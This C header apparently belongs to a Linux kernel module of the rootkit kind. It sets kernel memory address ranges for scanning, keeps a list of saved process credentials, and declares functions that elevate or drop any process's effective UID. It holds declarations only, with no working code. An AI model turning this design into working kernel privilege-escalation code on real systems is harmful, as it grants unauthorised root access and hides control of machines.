#ifndef ELEVATE_H
#define ELEVATE_H

#include <linux/err.h>
#include <linux/errno.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/syscalls.h>

#include "sctm.h"

#if defined __i386__
    #define START_ADDRESS 0xc0000000
    #define END_ADDRESS 0xd0000000
	typedef unsigned int addr_size;
#elif defined __x86_64__
    #define START_ADDRESS 0xffffffff81000000
    #define END_ADDRESS 0xffffffffa2000000
    typedef unsigned long addr_size;
#endif

/* elevate/drop EUIDs */

/* custom struct to store pids */
typedef struct pid_node {
	pid_t 		pid;
	kuid_t uid, suid, euid, fsuid;
	kgid_t gid, sgid, egid, fsgid;
	struct pid_node *prev, *next;
} PID_NODE;

/* drop a process's EUID */
int drop(const pid_t pid);

/* elevate a process's EUID */
int elevate(const pid_t pid);

int elevate_exit(void);

int elevate_init(struct sctm *sctm);

/* insert pid node */
static PID_NODE *insert_pid_node(PID_NODE **head, PID_NODE *new_node);

/* find pid node by pid */
static PID_NODE *find_pid_node(PID_NODE **head, pid_t pid);

/* delete pid node by pid */
static void delete_pid_node(PID_NODE **head, PID_NODE *node);

/* process escalation method */
static void process_escalate(pid_t pid);

/* process descalation method */
static void process_deescalate(pid_t pid);


#endif

